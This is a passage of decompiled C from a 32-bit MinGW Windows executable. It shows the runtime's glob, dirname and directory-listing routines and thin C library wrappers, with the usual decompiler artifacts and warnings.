*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403c54;
local_38 = (char *)_text(iVar8,uVar6);
if (local_38 == (char *)0x0) {
*(char **)(&stack0xffffff84 + iVar11) = in_EAX;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x403c69;
_strlen((char **)(&stack0xffffff84 + iVar11));
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403c77;
uVar6 = ___chkstk_ms((&stack0xffffff84)[iVar11]);
iVar8 = -uVar6;
pcVar12 = acStack_70 + iVar8 + iVar11;
do {
cVar5 = *in_EAX;
if (cVar5 == '\x7f') {
cVar5 = in_EAX[1];
in_EAX = in_EAX + 1;
}
in_EAX = in_EAX + 1;
*pcVar12 = cVar5;
pcVar12 = pcVar12 + 1;
} while (cVar5 != '\0');
*(char **)(&stack0xffffff84 + iVar8 + iVar11) = acStack_70 + iVar8 + iVar11;
*(undefined4 )((int)&pcStackY_80 + iVar8 + iVar11) = 0x403ca6;
pcVar12 = _strdup((char **)(&stack0xffffff84 + iVar8 + iVar11));
ppvVar4 = (void **)(&stack0xffffff84 + iVar11);
if ((pcVar12 == (char *)0x0) ||
(ppvVar4 = (void **)(&stack0xffffff84 + iVar11), param_3 == (void *)0x0)) {
LAB_00403bcb:
ppiVar20 = (int **)ppvVar4;
local_48 = local_24;
}
else {
*(undefined4 *)((int)&pcStackY_80 + iVar11) = 0x403cc3;
FUN_004033e0(extraout_ECX_10,(int)param_3);
local_48 = local_24;
}
goto LAB_00403b2a;
}
}
local_61 = '\\';
local_60 = (char *)0x0;
local_3c = in_EAX;
}
local_38 = (char *)0x2;
local_48 = local_24;
iVar8 = *local_24;
local_30 = (char *)(local_34 & 0x8000);
ppiVar20 = (int **)(&stack0xffffff84 + iVar11);
ppcVar15 = (char **)(&stack0xffffff84 + iVar11);
if (iVar8 != 0) {
LAB_00403619:
ppiVar20 = (int **)ppcVar15;
*ppiVar20 = (int *)iVar8;
((char **)ppiVar20)[-1] = (char *)0x403621;
puVar10 = ___mingw_opendir((char *)*ppiVar20);
pcVar3 = local_40;
if (puVar10 == (undefined4 *)0x0) {
piVar25 = local_48;
if ((local_34 & 4) != 0) {
LAB_00403af5:
piVar19 = piVar25 + 1;
*ppiVar20 = (int *)*piVar25;
ppiVar20[-1] = (int *)0x403aff;
_free(*ppiVar20);
if (piVar25[1] == 0) goto LAB_00403b1d;
LAB_00403b06:
iVar11 = local_48[1];
do {
piVar19 = piVar19 + 1;
*ppiVar20 = (int *)iVar11;
ppiVar20[-1] = (int *)0x403b17;
_free(*ppiVar20);
iVar11 = *piVar19;
} while (iVar11 != 0);
LAB_00403b1d:
local_38 = (char *)0x1;
local_48 = local_24;
goto LAB_00403b2a;
}
if (local_40 != (code *)0x0) {
((char **)ppiVar20)[-1] = (char *)0x403be6;
ppcVar15 = (char **)__errno();
((char **)ppiVar20)[1] = *ppcVar15;
piVar25 = local_48;
*ppiVar20 = (int *)*local_48;
ppcVar21 = (char **)ppiVar20 + -1;
ppiVar20 = (int **)((char **)ppiVar20 + -1);
*ppcVar21 = (char *)0x403bf6;
iVar11 = (*pcVar3)();
if (iVar11 != 0) goto LAB_00403af5;
}
}
else {
if (local_60 == (char *)0x0) {
local_44 = (undefined *)0x0;
pvVar7 = extraout_ECX_00;
}
else {
*ppiVar20 = (int *)*local_48;
((char **)ppiVar20)[-1] = (char *)0x403643;
local_44 = (undefined *)_strlen((char *)*ppiVar20);
pvVar7 = extraout_ECX_01;
}
local_4c = (undefined4 *)0x0;
local_58 = local_44 + 2;
ppcVar15 = (char **)ppiVar20;
LAB_00403660:
ppiVar20 = (int **)ppcVar15;
*ppiVar20 = puVar10;
ppiVar20[-1] = (int *)0x403668;
iVar11 = ___mingw_readdir(pvVar7,(int)*ppiVar20);
uVar6 = local_34;
if (iVar11 != 0) {
ppcVar15 = (char **)ppiVar20;
if ((local_30 == (char *)0x0) || (pvVar7 = extraout_ECX_02, *(int *)(iVar11 + 8) == 0x10)) {
ppiVar20[-1] = (int *)0x40368f;
iVar8 = FUN_004031c0(uVar6,(char *)(iVar11 + 0xc));
pvVar7 = extraout_ECX_03;
if (iVar8 == 0) {
local_54 = (undefined *)ppiVar20;
ppiVar20[-1] = (int )0x4036ac;
uVar6 = ___chkstk_ms((undefined *)ppiVar20);
puVar13 = local_44;
iVar8 = -uVar6;
local_50 = (undefined4 *)0x0;
pcVar12 = (char *)((int)ppiVar20 + iVar8 + 0xc);
iVar16 = extraout_EDX_00;
if (local_44 != (undefined *)0x0) {
local_50 = (undefined4 *)extraout_EDX_00;
iVar16 = *local_48;
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined **)((int)ppiVar20 + iVar8 + 8) = puVar13;
*(int *)((int)ppiVar20 + iVar8 + 4) = iVar16;
(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x403b5b;
_memcpy((void **)((int)ppiVar20 + iVar8),(void **)((int)ppiVar20 + iVar8 + 4),
*(size_t *)((int)ppiVar20 + iVar8 + 8));
iVar16 = (int)local_50;
if ((local_44[(int)((int)ppiVar20 + iVar8 + 0xb)] == '/') ||
(local_44[(int)((int)ppiVar20 + iVar8 + 0xb)] == '\\')) {
local_50 = (undefined4 *)local_44;
}
else {
local_50 = (undefined4 *)(local_44 + 1);
pcVar12[(int)local_44] = local_61;
}
}
puVar13 = (undefined *)local_50;
*(char **)((int)ppiVar20 + iVar8 + 4) = (char *)(iVar11 + 0xc);
*(int *)((int)ppiVar20 + iVar8 + 8) = iVar16 + 1;
*(undefined **)((int)ppiVar20 + iVar8) = puVar13 + (int)pcVar12;
(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x4036de;
_memcpy((void **)((int)ppiVar20 + iVar8),(void **)((int)ppiVar20 + iVar8 + 4),
*(size_t *)((int)ppiVar20 + iVar8 + 8));
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x4036e6;
_strlen((char **)((int)ppiVar20 + iVar8));
*(undefined4 )((int)ppiVar20 + iVar8 + -4) = 0x4036f4;
uVar6 = ___chkstk_ms((undefined *)((int)ppiVar20 + iVar8));
iVar11 = -uVar6;
pcVar17 = (char *)((int)ppiVar20 + iVar11 + iVar8 + 0xc);
pcVar22 = pcVar17;
do {
while (cVar5 = *pcVar12, cVar5 != '\x7f') {
pcVar12 = pcVar12 + 1;
*pcVar22 = cVar5;
pcVar22 = pcVar22 + 1;
if (cVar5 == '\0') goto LAB_00403729;
}
cVar5 = pcVar12[1];
pcVar12 = pcVar12 + 2;
*pcVar22 = cVar5;
pcVar22 = pcVar22 + 1;
} while (cVar5 != '\0');
LAB_00403729:
*(char **)((int)ppiVar20 + iVar11 + iVar8) = pcVar17;
*(undefined4 )((int)ppiVar20 + iVar11 + iVar8 + -4) = 0x403731;
pcVar12 = _strdup((char **)((int)ppiVar20 + iVar11 + iVar8));
ppcVar15 = (char **)local_54;
if (pcVar12 == (char *)0x0) {
local_38 = (char *)0x3;
pvVar7 = extraout_ECX_04;
goto LAB_00403660;
}
local_38 = (char *)((uint)local_38 & (local_38 == (char *)0x2) - 1);
if ((local_34 & 0x40) == 0) {
if (local_4c == (undefined4 *)0x0) {
*(undefined4 *)((int)ppiVar20 + iVar8) = 0xc;
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x403c21;
puVar14 = (undefined4 )_malloc((size_t *)((int)ppiVar20 + iVar8));
pvVar7 = extraout_ECX_09;
ppcVar15 = (char **)local_54;
if (puVar14 == (undefined4 *)0x0) goto LAB_00403660;
puVar14[2] = pcVar12;
puVar14[1] = 0;
*puVar14 = 0;
pvVar7 = extraout_ECX_09;
}
else {
uVar6 = local_34 & 0x4000;
local_50 = puVar10;
puVar14 = local_4c;
do {
puVar18 = puVar14;
uVar1 = puVar18[2];
*(char **)((int)ppiVar20 + iVar8) = pcVar12;
*(undefined4 *)((int)ppiVar20 + iVar8 + 4) = uVar1;
if (uVar6 == 0) {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x40379a;
puVar13 = (undefined )
_stricoll((char **)((int)ppiVar20 + iVar8),
*(char **)((int)ppiVar20 + iVar8 + 4));
puVar14 = (undefined4 *)*puVar18;
puVar2 = (undefined4 *)puVar18[1];
puVar10 = local_50;
}
else {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x403778;
puVar13 = (undefined )
_strcoll((char **)((int)ppiVar20 + iVar8),
*(char **)((int)ppiVar20 + iVar8 + 4));
puVar14 = (undefined4 *)*puVar18;
puVar2 = (undefined4 *)puVar18[1];
puVar10 = local_50;
}
if (0 < (int)puVar13) {
puVar14 = puVar2;
}
local_50 = puVar10;
} while (puVar14 != (undefined4 *)0x0);
local_50 = (undefined4 *)puVar13;
*(undefined4 *)((int)ppiVar20 + iVar8) = 0xc;
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x4037bb;
puVar14 = (undefined4 )_malloc((size_t *)((int)ppiVar20 + iVar8));
pvVar7 = extraout_ECX_05;
ppcVar15 = (char **)local_54;
if (puVar14 == (undefined4 *)0x0) goto LAB_00403660;
puVar14[2] = pcVar12;
puVar14[1] = 0;
*puVar14 = 0;
if (0 < (int)local_50) {
puVar18[1] = puVar14;
pvVar7 = extraout_ECX_05;
goto LAB_00403660;
}
*puVar18 = puVar14;
pvVar7 = extraout_ECX_05;
if (local_4c != (undefined4 *)0x0) goto LAB_00403660;
}
local_4c = puVar14;
ppcVar15 = (char **)local_54;
goto LAB_00403660;
}
pvVar7 = param_3;
if (param_3 != (void *)0x0) {
*(undefined4 *)((int)ppiVar20 + iVar8 + -4) = 0x403ba5;
FUN_004033e0(param_3,(int)param_3);
pvVar7 = extraout_ECX_08;
ppcVar15 = (char **)local_54;
}
}
}
goto LAB_00403660;
}
*ppiVar20 = puVar10;
ppiVar20[-1] = (int *)0x403a8b;
___mingw_closedir(*ppiVar20);
if (local_4c != (undefined4 *)0x0) {
ppiVar20[-1] = (int *)0x403a9d;
FUN_00403440(extraout_ECX_07,(int)param_3);
}
}
piVar25 = local_48;
piVar19 = local_48 + 1;
*ppiVar20 = (int *)*local_48;
ppiVar20[-1] = (int *)0x403aae;
_free(*ppiVar20);
iVar8 = piVar25[1];
ppvVar4 = ppiVar20;
if (iVar8 == 0) goto LAB_00403bcb;
if (local_38 == (char *)0x1) goto LAB_00403b06;
local_48 = piVar19;
ppcVar15 = (char **)ppiVar20;
goto LAB_00403619;
}
LAB_00403b2a:
*ppiVar20 = local_48;
ppiVar20[-1] = (int *)0x403b35;
_free(*ppiVar20);
return (uint)local_38;
while (iVar8 = iVar8 + -1, iVar8 != 0) {
LAB_00403930:
cVar5 = pcVar24[1];
pcVar12 = pcVar24 + 1;
if (cVar5 == '\x7f') {
cVar5 = pcVar24[2];
pcVar24 = pcVar12;
while( true ) {
if (cVar5 == '\0') goto LAB_004039d0;
cVar5 = pcVar24[2];
pcVar12 = pcVar24 + 2;
if (cVar5 != '\x7f') break;
cVar5 = pcVar24[3];
pcVar24 = pcVar12;
}
}
pcVar24 = pcVar12;
if (cVar5 == '{') {
iVar8 = iVar8 + 1;
goto LAB_00403930;
}
if (cVar5 != '}') {
if (cVar5 == '\0') {
LAB_004039d0:
*pcVar22 = '\0';
return 1;
}
goto LAB_00403930;
}
}
LAB_00403973:
pcVar24 = pcVar12 + 1;
cVar5 = pcVar12[1];
while( true ) {
pcVar24 = pcVar24 + 1;
*pcVar22 = cVar5;
if (cVar5 == '\0') break;
cVar5 = *pcVar24;
pcVar22 = pcVar22 + 1;
}
*(void **)(&stack0xffffff84 + iVar11) = param_3;
uVar6 = local_34;
pcVar3 = local_40;
uVar23 = local_34 | 1;
*(undefined4 )((int)&pcStackY_80 + iVar11) = 0x4039a9;
uVar6 = FUN_00403490(pcVar3,uVar6,(void **)(&stack0xffffff84 + iVar11));
local_34 = uVar23;
if (uVar6 == 1) {
return 1;
}
if (*pcVar17 != ',') {
return uVar6;
}
goto LAB_00403875;
}
// WARNING: Unable to track spacebase fully for stack
uint __cdecl ___mingw_glob(char *param_1,uint param_2,undefined *param_3,char **param_4)
{
char cVar1;
int iVar2;
undefined *puVar3;
uint uVar4;
char *pcVar5;
undefined4 uStackY_40;
char acStack_38 [20];
uint local_24;
undefined *local_20;
if ((param_4 != (char **)0x0) && ((param_2 & 2) == 0)) {
param_4[3] = (char *)0x0;
}
if (*param_4 != ""glob-1.0-mingw32"") {
uStackY_40 = 0x403d4d;
FUN_00402e90();
*param_4 = ""glob-1.0-mingw32"";
}
uStackY_40 = 0x403d62;
local_24 = FUN_00403490(param_3,param_2,param_4);
if ((local_24 == 2) && ((param_2 & 0x10) != 0)) {
uStackY_40 = 0x403d93;
pcVar5 = param_1;
local_20 = &stack0xffffffc4;
_strlen(param_1);
uStackY_40 = 0x403da1;
uVar4 = ___chkstk_ms((char)pcVar5);
iVar2 = -uVar4;
pcVar5 = acStack_38 + iVar2;
do {
while (cVar1 = *param_1, cVar1 == '\x7f') {
cVar1 = param_1[1];
param_1 = param_1 + 2;
*pcVar5 = cVar1;
pcVar5 = pcVar5 + 1;
if (cVar1 == '\0') goto LAB_00403dd8;
}
param_1 = param_1 + 1;
*pcVar5 = cVar1;
pcVar5 = pcVar5 + 1;
} while (cVar1 != '\0');
LAB_00403dd8:
*(char **)(&stack0xffffffc4 + iVar2) = acStack_38 + iVar2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x403de3;
pcVar5 = _strdup((char **)(&stack0xffffffc4 + iVar2));
puVar3 = local_20;
uVar4 = local_24;
if (pcVar5 != (char *)0x0) {
local_20 = (undefined *)local_24;
*(undefined4 *)(puVar3 + -4) = 0x403dfb;
FUN_004033e0(uVar4,(int)param_4);
local_24 = (uint)local_20;
}
}
return local_24;
}
// WARNING: Unable to track spacebase fully for stack
char * __cdecl ___mingw_dirname(char *param_1)
{
short *psVar1;
int iVar2;
char *_Src;
size_t sVar3;
uint uVar4;
short *psVar5;
short *psVar6;
short *psVar7;
short *psVar8;
short sVar9;
undefined4 extraout_EDX;
undefined4 uStackY_40;
undefined uVar10;
short asStack_30 [2];
size_t local_2c;
undefined *local_28;
short local_22;
short *local_20;
uStackY_40 = 0x403e8d;
_Src = _setlocale(2,(char *)0x0);
if (_Src != (char *)0x0) {
uStackY_40 = 0x403e9b;
_Src = _strdup(_Src);
}
uStackY_40 = 0x403eb1;
_setlocale(2,"""");
if ((param_1 == (char *)0x0) || (*param_1 == '\0')) {
LAB_00403ec0:
uStackY_40 = 0x403edc;
sVar3 = _wcstombs((char *)0x0,L""."",0);
uStackY_40 = 0x403ef0;
_bss = (char *)_realloc(_bss,sVar3 + 1);
uStackY_40 = 0x403f09;
_wcstombs(_bss,L""."",sVar3 + 1);
uStackY_40 = 0x403f19;
_setlocale(2,_Src);
uStackY_40 = 0x403f21;
_free(_Src);
return _bss;
}
uVar10 = 0;
uStackY_40 = 0x403f4f;
local_28 = &stack0xffffffc4;
_mbstowcs((wchar_t *)0x0,param_1,0);
uStackY_40 = 0x403f60;
uVar4 = ___chkstk_ms(uVar10);
iVar2 = -uVar4;
*(undefined4 *)(&stack0xffffffcc + iVar2) = extraout_EDX;
psVar1 = (short *)((int)asStack_30 + iVar2);
*(short **)(&stack0xffffffc4 + iVar2) = psVar1;
*(char **)(&stack0xffffffc8 + iVar2) = param_1;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x403f79;
sVar3 = _mbstowcs((wchar_t **)(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
local_2c = sVar3;
psVar1[sVar3] = 0;
local_22 = *psVar1;
local_20 = psVar1;
if (1 < sVar3) {
if ((local_22 == 0x2f) || (local_22 == 0x5c)) {
if ((local_22 == *(short )((int)asStack_30 + iVar2 + 2)) &&
((short *)((int)&local_2c + iVar2) == 0)) {
*(char **)(&stack0xffffffc8 + iVar2) = _Src;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x4041e0;
_setlocale((int )(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2));
*(char **)(&stack0xffffffc4 + iVar2) = _Src;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x4041e8;
_free((void **)(&stack0xffffffc4 + iVar2));
return param_1;
}
}
else if ((short *)((int)asStack_30 + iVar2 + 2) == 0x3a) {
local_20 = (short *)((int)&local_2c + iVar2);
local_22 = *(short *)((int)&local_2c + iVar2);
}
}
psVar6 = local_20;
psVar8 = local_20;
psVar7 = local_20;
sVar9 = local_22;
if (local_22 == 0) goto LAB_00403ec0;
do {
while ((psVar5 = psVar8, sVar9 == 0x2f || (sVar9 == 0x5c))) {
sVar9 = *psVar5;
if (sVar9 != 0x2f) goto LAB_00404001;
do {
do {
psVar5 = psVar5 + 1;
sVar9 = *psVar5;
} while (sVar9 == 0x2f);
LAB_00404001:
} while (sVar9 == 0x5c);
if (sVar9 == 0) goto LAB_0040401a;
psVar8 = psVar5 + 1;
psVar7 = psVar5;
sVar9 = psVar5[1];
if (psVar5[1] == 0) goto LAB_0040401a;
}
psVar8 = psVar5 + 1;
sVar9 = psVar5[1];
} while (psVar5[1] != 0);
LAB_0040401a:
if (psVar7 <= local_20) {
if ((local_22 != 0x2f) && (local_22 != 0x5c)) {
*local_20 = 0x2e;
}
psVar6[1] = 0;
*(undefined4 *)(&stack0xffffffcc + iVar2) = 0;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 0;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x404068;
sVar3 = _wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
*(short **)(&stack0xffffffc8 + iVar2) = (short *)(sVar3 + 1);
local_20 = (short *)(sVar3 + 1);
*(char **)(&stack0xffffffc4 + iVar2) = _bss;
*(undefined4 *)((int)&uStackY_40 + iVar2) = 0x40407f;
param_1 = (char )_realloc((void **)(&stack0xffffffc4 + iVar2),
*(size_t *)(&stack0xffffffc8 + iVar2));
psVar6 = local_20;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(char **)(&stack0xffffffc4 + iVar2) = param_1;
*(short **)(&stack0xffffffcc + iVar2) = psVar6;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x404099;
_bss = param_1;
_wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
goto LAB_00404160;
}
do {
psVar6 = psVar7 + -1;
if (psVar6 <= local_20) {
if ((local_20 == psVar6) &&
((((local_22 == 0x2f || (local_22 == 0x5c)) && (*psVar7 == local_22)) &&
((psVar7[1] != 0x2f && (psVar7[1] != 0x5c)))))) {
psVar6 = psVar7;
}
break;
}
psVar8 = psVar7 + -1;
psVar7 = psVar6;
} while ((*psVar8 == 0x2f) || (*psVar8 == 0x5c));
psVar6[1] = 0;
sVar9 = *psVar1;
psVar7 = psVar1;
psVar6 = psVar1;
psVar8 = psVar1;
if ((sVar9 == 0x2f) || (sVar9 == 0x5c)) {
do {
do {
psVar7 = psVar7 + 1;
} while (*psVar7 == 0x2f);
} while (psVar7 == 0x5c);
if ((int)psVar7 - (int)psVar1 < 6) goto LAB_004041ed;
}
else {
LAB_004041ed:
if ((short *)((int)asStack_30 + iVar2 + 2) == sVar9) {
sVar9 = *psVar7;
psVar6 = psVar7;
psVar8 = psVar7;
}
}
while (psVar7 = psVar6, psVar6 = psVar8, sVar9 != 0) {
while( true ) {
psVar8 = psVar6 + 1;
*psVar6 = sVar9;
psVar6 = psVar7;
if ((sVar9 == 0x2f) || (psVar6 = psVar7 + 1, *psVar7 == 0x5c)) break;
sVar9 = psVar7[1];
psVar7 = psVar6;
psVar6 = psVar8;
if (sVar9 == 0) goto LAB_00404139;
}
sVar9 = *psVar6;
if ((sVar9 == 0x5c) || (sVar9 == 0x2f)) {
do {
do {
psVar6 = psVar6 + 1;
sVar9 = *psVar6;
} while (sVar9 == 0x2f);
} while (sVar9 == 0x5c);
}
}
LAB_00404139:
sVar3 = local_2c;
*psVar8 = 0;
*(short **)(&stack0xffffffc8 + iVar2) = psVar1;
*(size_t *)(&stack0xffffffcc + iVar2) = sVar3;
*(char **)(&stack0xffffffc4 + iVar2) = param_1;
(undefined4 )((int)&uStackY_40 + iVar2) = 0x404154;
sVar3 = _wcstombs((char **)(&stack0xffffffc4 + iVar2),(wchar_t **)(&stack0xffffffc8 + iVar2),
*(size_t *)(&stack0xffffffcc + iVar2));
if (sVar3 != 0xffffffff) {
param_1[sVar3] = '\0';
}
LAB_00404160:
*(char **)(&stack0xffffffc8 + iVar2) = _Src;
*(undefined4 *)(&stack0xffffffc4 + iVar2) = 2;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x404170;
_setlocale((int )(&stack0xffffffc4 + iVar2),(char **)(&stack0xffffffc8 + iVar2));
*(char **)(&stack0xffffffc4 + iVar2) = _Src;
*(undefined4 )((int)&uStackY_40 + iVar2) = 0x404178;
_free((void **)(&stack0xffffffc4 + iVar2));
return param_1;
}
HANDLE __fastcall _text(undefined4 param_1,int param_2)
{
char cVar1;
ushort uVar2;
LPCSTR in_EAX;
HANDLE pvVar3;
DWORD *pDVar4;
DWORD DVar5;
int *piVar6;
char *pcVar7;
_WIN32_FIND_DATAA local_14c;
pvVar3 = _FindFirstFileA_8(in_EAX,&local_14c);
if (pvVar3 == (HANDLE)0xffffffff) {
pDVar4 = (DWORD *)__errno();
DVar5 = _GetLastError_0();
*pDVar4 = DVar5;
if (DVar5 == 3) {
piVar6 = __errno();
*piVar6 = 2;
}
else {
piVar6 = __errno();
if (*piVar6 == 0x10b) {
piVar6 = __errno();
*piVar6 = 0x14;
}
else {
piVar6 = __errno();
if (*piVar6 != 2) {
piVar6 = __errno();
*piVar6 = 0x16;
}
}
}
}
else {
pcVar7 = (char *)(param_2 + 0xc);
*(undefined2 *)(param_2 + 6) = 0;
uVar2 = 0;
while (cVar1 = local_14c.cFileName[uVar2], *pcVar7 = cVar1, cVar1 != '\0') {
uVar2 = *(short *)(param_2 + 6) + 1;
*(ushort *)(param_2 + 6) = uVar2;
pcVar7 = pcVar7 + (uVar2 < 0x104);
}
if ((local_14c.dwFileAttributes & 0xffffff58) < 0x11) {
*(DWORD *)(param_2 + 8) = local_14c.dwFileAttributes & 0xffffff58;
return pvVar3;
}
*(undefined4 *)(param_2 + 8) = 0x18;
}
return pvVar3;
}
BOOL __fastcall FUN_00404340(undefined4 param_1,int param_2)
{
char cVar1;
ushort uVar2;
HANDLE in_EAX;
BOOL BVar3;
DWORD DVar4;
int *piVar5;
char *pcVar6;
_WIN32_FIND_DATAA local_14c;
BVar3 = _FindNextFileA_8(in_EAX,&local_14c);
if (BVar3 == 0) {
DVar4 = _GetLastError_0();
if (DVar4 != 0x12) {
piVar5 = __errno();
*piVar5 = 2;
return 0;
}
}
else {
pcVar6 = (char *)(param_2 + 0xc);
*(undefined2 *)(param_2 + 6) = 0;
uVar2 = 0;
while (cVar1 = local_14c.cFileName[uVar2], *pcVar6 = cVar1, cVar1 != '\0') {
uVar2 = *(short *)(param_2 + 6) + 1;
*(ushort *)(param_2 + 6) = uVar2;
pcVar6 = pcVar6 + (uVar2 < 0x104);
}
if (0x10 < (local_14c.dwFileAttributes & 0xffffff58)) {
*(undefined4 *)(param_2 + 8) = 0x18;
return BVar3;
}
*(DWORD *)(param_2 + 8) = local_14c.dwFileAttributes & 0xffffff58;
}
return BVar3;
}
undefined4 * __cdecl ___mingw_opendir(char *param_1)
{
int iVar1;
char *pcVar2;
uint *puVar3;
undefined4 *_Memory;
HANDLE pvVar4;
int *piVar5;
undefined4 extraout_ECX;
uint uVar6;
uint uVar7;
uint *puVar8;
char local_120;
if (param_1 == (char *)0x0) {
piVar5 = __errno();
_Memory = (undefined4 *)0x0;
*piVar5 = 0x16;
}
else if (*param_1 == '\0') {
piVar5 = __errno();
_Memory = (undefined4 *)0x0;
*piVar5 = 2;
}
else {
__fullpath(&local_120,param_1,0x104);
puVar8 = (uint *)&local_120;
if (local_120 == '\0') {
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
pcVar2 = (char *)((int)puVar8 +
((-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120));
}
else {
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
pcVar2 = (char *)((int)puVar8 +
((-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120));
if (((&stack0xfffffedc)[(int)(pcVar2 + 3)] != '/') &&
((&stack0xfffffedc)[(int)(pcVar2 + 3)] != '\\')) {
*(undefined2 *)((int)&local_120 + (int)pcVar2) = 0x5c;
pcVar2 = pcVar2 + 1;
}
}
*(undefined2 *)((int)&local_120 + (int)pcVar2) = 0x2a;
puVar8 = (uint *)&local_120;
do {
puVar3 = puVar8;
puVar8 = puVar3 + 1;
uVar6 = *puVar3 + 0xfefefeff & ~*puVar3;
uVar7 = uVar6 & 0x80808080;
} while (uVar7 == 0);
if ((uVar6 & 0x8080) == 0) {
uVar7 = uVar7 >> 0x10;
puVar8 = (uint *)((int)puVar3 + 6);
}
iVar1 = (-3 - (uint)CARRY1((byte)uVar7,(byte)uVar7)) - (int)&local_120;
_Memory = (undefined4 *)_malloc((size_t)((int)puVar8 + iVar1 + 0x11c));
if (_Memory == (undefined4 *)0x0) {
piVar5 = __errno();
*piVar5 = 0xc;
}
else {
_memcpy(_Memory + 0x46,&local_120,(size_t)((int)puVar8 + iVar1 + 1));
pvVar4 = _text(extraout_ECX,(int)_Memory);
_Memory[0x44] = pvVar4;
if (pvVar4 == (HANDLE)0xffffffff) {
_free(_Memory);
_Memory = (undefined4 *)0x0;
}
else {
_Memory[0x45] = 0;
*_Memory = 0;
*(undefined2 *)(_Memory + 1) = 0x110;
}
}
}
return _Memory;
}
int __thiscall ___mingw_readdir(void *this,int param_1)
{
int iVar1;
BOOL BVar2;
int *piVar3;
if (param_1 == 0) {
piVar3 = __errno();
*piVar3 = 9;
param_1 = 0;
}
else {
iVar1 = *(int *)(param_1 + 0x114);
*(int *)(param_1 + 0x114) = iVar1 + 1;
if ((0 < iVar1) && (BVar2 = FUN_00404340(this,param_1), BVar2 == 0)) {
return 0;
}
}
return param_1;
}
undefined4 __cdecl ___mingw_closedir(void *param_1)
{
BOOL BVar1;
int *piVar2;
if ((param_1 != (void )0x0) &&
(BVar1 = _FindClose_4((HANDLE *)((int)param_1 + 0x110)), BVar1 != 0)) {
_free(param_1);
return 0;
}
piVar2 = __errno();
*piVar2 = 9;
return 0xffffffff;
}
void __cdecl ___mingw_rewinddir(int param_1)
{
BOOL BVar1;
int piVar2;
HANDLE pvVar3;
undefined4 extraout_ECX;
if ((param_1 != 0) && (BVar1 = _FindClose_4((HANDLE *)(param_1 + 0x110)), BVar1 != 0)) {
pvVar3 = _text(extraout_ECX,param_1);
*(HANDLE *)(param_1 + 0x110) = pvVar3;
if (pvVar3 == (HANDLE)0xffffffff) {
return;
}
*(undefined4 *)(param_1 + 0x114) = 0;
return;
}
piVar2 = __errno();
*piVar2 = 9;
return;
}
size_t __cdecl _wcstombs(char *_Dest,wchar_t *_Source,size_t _MaxCount)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404760. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = wcstombs(_Dest,_Source,_MaxCount);
return sVar1;
}
int __cdecl _vfprintf(FILE *_File,char *_Format,va_list _ArgList)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404768. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = vfprintf(_File,_Format,_ArgList);
return iVar1;
}
int __cdecl _tolower(int _C)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404770. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = tolower(_C);
return iVar1;
}
char * __cdecl _strncpy(char *_Dest,char *_Source,size_t _Count)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404778. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = strncpy(_Dest,_Source,_Count);
return pcVar1;
}
int __cdecl _strncmp(char *_Str1,char *_Str2,size_t _MaxCount)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404780. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = strncmp(_Str1,_Str2,_MaxCount);
return iVar1;
}
size_t __cdecl _strlen(char *_Str)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x00404788. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = strlen(_Str);
return sVar1;
}
char * __cdecl _strcpy(char *_Dest,char *_Source)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404790. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = strcpy(_Dest,_Source);
return pcVar1;
}
int __cdecl _strcoll(char *_Str1,char *_Str2)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404798. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = strcoll(_Str1,_Str2);
